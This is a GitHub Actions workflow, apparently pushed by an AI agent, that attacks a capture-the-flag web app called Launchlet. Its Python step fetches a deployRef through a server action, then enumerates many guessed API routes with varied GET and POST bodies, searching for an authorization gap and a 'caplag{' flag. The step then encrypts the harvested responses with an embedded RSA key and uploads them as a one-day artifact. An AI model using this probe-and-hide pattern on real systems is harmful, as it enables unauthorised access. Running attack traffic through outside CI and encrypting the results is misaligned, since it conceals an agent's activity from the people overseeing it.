name: launchlet-part2-auth-probe

on:
  push:
    branches: [agent/launchlet-part2-auth-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Probe dynamic routes from returned deployRef
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests, pathlib, urllib.parse, json
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']
          h={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}
          inv=s.post(urllib.parse.urljoin(base,act['endpoint']),headers=h,json={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}},timeout=15,allow_redirects=False)
          deploy_ref=inv.json()['inspector']['deployRef']
          paths=[
            f'/api/deploy/{deploy_ref}',f'/api/deploys/{deploy_ref}',f'/api/deployment/{deploy_ref}',f'/api/deployments/{deploy_ref}',
            f'/api/preview/{deploy_ref}',f'/api/previews/{deploy_ref}',f'/api/build/{deploy_ref}',f'/api/builds/{deploy_ref}',
            f'/api/inspect/{deploy_ref}',f'/api/inspector/{deploy_ref}',f'/api/deploy/inspect/{deploy_ref}',f'/api/deployments/inspect/{deploy_ref}',
            f'/api/deploy/{deploy_ref}/inspect',f'/api/deployments/{deploy_ref}/inspect',f'/api/preview/{deploy_ref}/inspect',
            f'/api/reference/{deploy_ref}',f'/api/references/{deploy_ref}',f'/api/server-reference/{deploy_ref}',f'/api/runtime/{deploy_ref}',
            f'/deploy/{deploy_ref}',f'/preview/{deploy_ref}'
          ]
          hits=[]
          bodies=[{}, {'deployRef':deploy_ref},{'ref':deploy_ref},{'id':deploy_ref},{'projectId':boot['project'],'workspaceId':boot['workspace'],'deployRef':deploy_ref}]
          for path in paths:
              u=urllib.parse.urljoin(base,path)
              for method in ['GET','POST']:
                  try:
                      if method=='GET': r=s.get(u,headers=h,timeout=10,allow_redirects=False)
                      else:
                          for b in bodies:
                              r=s.post(u,headers=h,json=b,timeout=10,allow_redirects=False)
                              if r.status_code!=404:
                                  hits.append({'path':path,'method':'POST','body_sent':b,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
                                  if 'caplag{' in r.text: break
                          continue
                      if r.status_code!=404:
                          hits.append({'path':path,'method':'GET','status':r.status_code,'body':r.text,'headers':dict(r.headers)})
                  except Exception as e: pass
          (out/'summary.json').write_text(json.dumps({'deployRef':deploy_ref,'hits':hits},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key
          openssl rand 16 > package/iv.bin
          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part2-deployref-encrypted
          path: artifact/
          retention-days: 1
